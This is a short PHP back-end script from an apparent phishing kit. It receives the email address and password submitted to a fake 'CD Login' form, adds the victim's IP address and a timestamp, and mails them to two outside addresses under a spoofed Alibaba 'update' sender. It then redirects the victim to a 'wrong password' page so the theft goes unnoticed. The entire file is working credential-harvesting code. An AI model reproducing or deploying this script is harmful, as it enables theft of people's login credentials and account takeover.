<?php

$msg = "---------------------------------------------------------------------------------------\n";
$msg .= "CD Login\n";
$msg .= "---------------------------------------------------------------------------------------\n";
$msg .= "Email Address 	: ".$_POST['log']."\n";
$msg .= "Password 	: ".$_POST['pwd']."\n";
$msg .= "---------------------------------------------------------------------------------------\n";
$msg .= "Sent from IP : ".$_SERVER['REMOTE_ADDR']." on time : ".date("m-d-y g:i:a")."\n";
$msg .= "---------------------------------------------------------------------------------------\n";


$to = "Richardsmith292929@gmail.com,Richardsmith292929@yandex.com";
$subject = " Login Info";
$from = "From: Bdami Update<news@update.Alibaba.com>";

mail($to,$subject,$msg,$from);

header("Location: Wrongpassword.php");
?>